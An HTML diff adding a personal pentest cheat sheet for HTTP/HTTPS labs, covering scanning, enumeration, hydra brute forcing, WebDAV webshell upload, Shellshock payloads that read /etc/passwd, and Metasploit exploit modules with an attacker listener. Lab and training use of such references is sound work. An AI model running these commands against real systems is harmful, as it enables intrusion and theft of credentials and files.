@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+
+<html dir="ltr" lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>HTTP / HTTPS — Pentest Cheat Sheet</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+</style>
+<style>html[dir="ltr"] body{direction:ltr;text-align:left}html[dir="ltr"] .stage{border-right:1px solid var(--border);border-left:3px solid var(--gold)}html[dir="ltr"] .toc,html[dir="ltr"] .portnote,html[dir="ltr"] .note,html[dir="ltr"] .tip,html[dir="ltr"] .danger,html[dir="ltr"] .result{text-align:left}</style></head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">PORTS 80 / 443 / 8000 / 8080 / 8888 — HTTP / HTTPS</span>
+<h1>HTTP / HTTPS — Practical Assessment Reference</h1>
+<p>Quick service reference for authorized labs: discovery, enumeration, validation, access assessment, and documentation for HTTP / HTTPS.</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote"><b>Service note: </b>Ports, versions, and deployment details can vary by configuration. Confirm the actual service fingerprint instead of relying only on a default port.</div>
+<div class="toc"><span class="ttl">CONTENTS</span><ol>
+<li><a href="#s1">Reconnaissance</a></li><li><a href="#s2">Port Scanning</a></li><li><a href="#s3">Enumeration</a></li><li><a href="#s4">Credential Testing</a></li><li><a href="#s5">Exploitation</a></li><li><a href="#s6">Post-Exploitation</a></li>
+</ol></div>
+<div class="stage" id="s1"><h2>1. Reconnaissance</h2><p class="desc">Confirm the target, network path, and basic reachability before deeper testing.</p>
+<div class="step"><div class="step-title">Review the local network interfaces <span class="where">KALI TERMINAL</span></div><div class="cmd">ip a
+ifconfig</div></div>
+<div class="step"><div class="step-title">Check basic target reachability <span class="where">KALI TERMINAL</span></div><div class="cmd">ping -c 4 [TARGET]</div><div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div></div>
+<div class="step"><div class="step-title">Run the documented check: http://[TARGET] <span class="where">BROWSER</span></div><div class="cmd">http://[TARGET]
+https://[TARGET]</div><div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div></div>
+</div>
+<div class="stage" id="s2"><h2>2. Port Scanning</h2><p class="desc">Identify exposed ports, service versions, and relevant protocols before enumeration.</p>
+<div class="step"><div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div><div class="cmd">nmap -p80,443,8000,8080,8888 -sV [TARGET]</div><div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div></div>
+<div class="step"><div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div><div class="cmd">nmap -p- -sV -Pn [TARGET]</div><div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div></div>
+<div class="step"><div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div><div class="cmd">nmap -p[PORT] --script=http-enum,http-headers,http-methods [TARGET]</div><div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div></div>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap --top-ports 65536 [TARGET]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div><div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -sV -p80 [TARGET]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+<div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+</div></div>
+<div class="stage" id="s3"><h2>3. Enumeration</h2><p class="desc">Collect service metadata and enumerate only the information needed for the authorized lab.</p>
+<h3 class="sub">Technology &amp; Version</h3>
+<div class="grid2">
+<div class="step"><div class="step-title">Run the documented check: whatweb http://[TARGET]:[PORT] <span class="where">KALI TERMINAL</span></div><div class="cmd">whatweb http://[TARGET]:[PORT]</div></div>
+<div class="step"><div class="step-title">Send the HTTP request and review the response <span class="where">KALI TERMINAL</span></div><div class="cmd">curl -I http://[TARGET]:[PORT]
+curl -k -I https://[TARGET]:[PORT]</div></div>
+</div>
+<div class="step"><div class="step-title">Run the documented check: use auxiliary/scanner/http/http_version <span class="where">MSFCONSOLE</span></div><div class="cmd">use auxiliary/scanner/http/http_version
+set RHOSTS [TARGET]
+set RPORT [PORT]
+run</div></div>
+<h3 class="sub">Directory &amp; File Enumeration</h3>
+<div class="step"><div class="step-title">Enumerate web paths within the approved scope <span class="where">KALI TERMINAL</span></div><div class="cmd">gobuster dir -u http://[TARGET]:[PORT] -w [WORDLIST] -b 404 -x .php,.xml,.txt -r</div></div>
+<div class="step"><div class="step-title">Enumerate web paths within the approved scope <span class="where">KALI TERMINAL</span></div><div class="cmd">dirb http://[TARGET]:[PORT] [WORDLIST]</div></div>
+<div class="step"><div class="step-title">Run the documented check: nikto -h http://[TARGET]:[PORT] <span class="where">KALI TERMINAL</span></div><div class="cmd">nikto -h http://[TARGET]:[PORT]</div><div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div></div>
+<div class="step"><div class="step-title">Run the documented check: use auxiliary/scanner/http/robots_txt <span class="where">MSFCONSOLE</span></div><div class="cmd">use auxiliary/scanner/http/robots_txt
+set RHOSTS [TARGET]
+set RPORT [PORT]
+run</div></div>
+<h3 class="sub">Methods &amp; WebDAV</h3>
+<div class="step"><div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div><div class="cmd">nmap -p[PORT] --script=http-methods --script-args http-methods.url-path=/webdav/ [TARGET]</div></div>
+<div class="step"><div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div><div class="cmd">nmap -p[PORT] --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ [TARGET]</div><div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div></div>
+<div class="step"><div class="step-title">Run the documented check: davtest -url http://[TARGET]:[PORT]/webdav <span class="where">KALI TERMINAL</span></div><div class="cmd">davtest -url http://[TARGET]:[PORT]/webdav
+davtest -auth [USERNAME]:[PASSWORD] -url http://[TARGET]:[PORT]/webdav</div><div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div></div>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap --script http-enum -sV -p80 [TARGET]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div><div class="step">
+<div class="step-title">Enumerate web paths within the approved scope <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">dirb http://[TARGET]/</div>
+</div><div class="step">
+<div class="step-title">Enumerate web paths within the approved scope <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">gobuster dir -u http://[TARGET]/ -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.xml -b 404 -r</div>
+</div><div class="step">
+<div class="step-title">Run the documented check: davtest -url http://[TARGET]/webdav <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">davtest -url http://[TARGET]/webdav</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div><div class="step">
+<div class="step-title">Run the documented check: nikto -h http://[TARGET] <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nikto -h http://[TARGET]</div>
+</div><div class="step">
+<div class="step-title">Search for version-relevant public references <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">searchsploit [SERVER_NAME]</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div><div class="step">
+<div class="step-title">Run the documented check: Proxy: 127.0.0.1:8080 <span class="where">BROWSER PROXY SETTINGS</span></div>
+<div class="cmd">Proxy: 127.0.0.1:8080</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div></div>
+<div class="stage" id="s4"><h2>4. Credential Testing</h2><p class="desc">Assess authentication with known or explicitly authorized credentials only.</p>
+<h3 class="sub">HTTP Basic / GET Authentication</h3>
+<div class="step"><div class="step-title">Run the authorized credential check <span class="where">KALI TERMINAL</span></div><div class="cmd">hydra -L [USERLIST] -P [WORDLIST] -f [TARGET] http-get /[PATH]</div></div>
+<div class="step"><div class="step-title">Run the documented check: use auxiliary/scanner/http/http_login <span class="where">MSFCONSOLE</span></div><div class="cmd">use auxiliary/scanner/http/http_login
+set RHOSTS [TARGET]
+set RPORT [PORT]
+set AUTH_URI /[PATH]
+set USER_FILE [USERLIST]
+set PASS_FILE [WORDLIST]
+run</div></div>
+<h3 class="sub">Login Form</h3>
+<div class="step"><div class="step-title">Run the authorized credential check <span class="where">KALI TERMINAL</span></div><div class="cmd">hydra -L [USERLIST] -P [WORDLIST] [TARGET] http-post-form "/login.php:login=^USER^&amp;password=^PASS^&amp;form=submit:Invalid credentials"</div><div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div></div>
+<div class="step"><div class="step-title">Run the documented check: Proxy → Intercept → Submit login → Inspect request parameters <span class="where">BURP SUITE</span></div><div class="cmd">Proxy → Intercept → Submit login → Inspect request parameters and failure response</div><div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div></div>
+<div class="step">
+<div class="step-title">Run the documented check: davtest -auth [USER]:[PASS] -url http://[TARGET]/webdav <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">davtest -auth [USER]:[PASS] -url http://[TARGET]/webdav</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div></div>
+<div class="stage" id="s5"><h2>5. Exploitation</h2><p class="desc">Match any test to the confirmed service, version, prerequisites, and approved scope before proceeding.</p>
+<div class="danger">Warning: use this step only in an authorized lab or explicitly permitted assessment. Avoid disruptive changes unless they are part of the approved scope.</div>
+<h3 class="sub">Windows — WebDAV <span class="badge win">WINDOWS</span></h3>
+<div class="step"><div class="step-title">Run the documented check: cadaver http://[TARGET]:[PORT]/webdav <span class="where">KALI TERMINAL</span></div><div class="cmd">cadaver http://[TARGET]:[PORT]/webdav
+put /usr/share/webshells/asp/webshell.asp</div><div class="step-title">Webshell<span class="where">BROWSER</span></div><div class="cmd">http://[TARGET]:[PORT]/webdav/webshell.asp?cmd=whoami</div></div>
+<div class="step"><div class="step-title">Run the documented check: use exploit/windows/iis/iis_webdav_upload_asp <span class="where">MSFCONSOLE</span></div><div class="cmd">use exploit/windows/iis/iis_webdav_upload_asp
+set RHOSTS [TARGET]
+set RPORT [PORT]
+set PATH /webdav/metasploit%RAND%.asp
+set HttpUsername [USERNAME]
+set HttpPassword [PASSWORD]
+run</div></div>
+<h3 class="sub">Linux — Shellshock <span class="badge lin">LINUX</span></h3>
+<div class="step"><div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div><div class="cmd">nmap -p[PORT] --script=http-shellshock --script-args "http-shellshock.uri=/[CGI_PATH]" [TARGET]</div></div>
+<div class="step"><div class="step-title">Run the documented check: User-Agent: () { :; }; echo; echo; /bin/bash -c 'id' <span class="where">BURP SUITE</span></div><div class="cmd">User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'</div><div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div></div>
+<h3 class="sub">Version-Specific Web Services</h3>
+<div class="step"><div class="step-title">Search for a relevant module or reference <span class="where">MSFCONSOLE</span></div><div class="cmd">search type:exploit http [PRODUCT]
+info [MODULE]</div><div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div></div>
+<div class="step">
+<div class="step-title">Run the documented check: msfconsole -q <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">msfconsole -q
+use exploit/windows/http/rejetto_hfs_exec
+set RPORT 80
+set RHOSTS [TARGET]
+set LHOST [ATTACKER_IP]
+exploit</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div><div class="step">
+<div class="step-title">Run the documented check: msfconsole -q <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">msfconsole -q
+use exploit/windows/iis/iis_webdav_upload_asp
+set RHOSTS [TARGET]
+set HttpUsername [USER]
+set HttpPassword [PASS]
+set PATH /webdav/metasploit%RAND%.asp
+exploit</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div><div class="step">
+<div class="step-title">Search for version-relevant public references <span class="where">BROWSER / KALI TERMINAL</span></div>
+<div class="cmd">searchsploit apache tomcat [VERSION]
+
+# follow the authorized lab instructions
+
+"apache tomcat [VERSION] exploit"</div>
+</div><div class="step">
+<div class="step-title">Run the documented check: use exploit/multi/http/tomcat_jsp_upload_bypass <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use exploit/multi/http/tomcat_jsp_upload_bypass
+set RHOSTS [TARGET]
+set RPORT [PORT]
+check
+exploit</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+<div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+</div><div class="step">
+<div class="step-title">Run the documented check: User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/pass <span class="where">BURP SUITE — REPEATER</span></div>
+<div class="cmd">User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div></div>
+<div class="stage" id="s6"><h2>6. Post-Exploitation</h2><p class="desc">Match any test to the confirmed service, version, prerequisites, and approved scope before proceeding.</p>
+<div class="step"><div class="step-title">Run the documented check: whoami <span class="where">VICTIM SHELL</span></div><div class="cmd">whoami
+id</div></div>
+<div class="step"><div class="step-title">Run the documented check: whoami <span class="where">WINDOWS CMD</span></div><div class="cmd">whoami
+hostname</div></div>
+<div class="step"><div class="step-title">Run the documented check: python3 -c 'import pty; pty.spawn("/bin/bash")' <span class="where">VICTIM SHELL</span></div><div class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</div><div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div></div>
+<div class="step">
+<div class="step-title">Run the documented check: shell <span class="where">METERPRETER / VICTIM SHELL</span></div>
+<div class="cmd">shell
+cd /
+dir
+type flag.txt</div>
+</div></div>
+<footer>
+<div class="author">Prepared by Abdullah Nasser Almsan</div>
+<div class="disclaimer">Personal technical reference for learning and authorized penetration-testing labs only. The author is not responsible for misuse or unauthorized activity outside the approved scope.</div>
+</footer>
+</div>
+</body>
+</html>
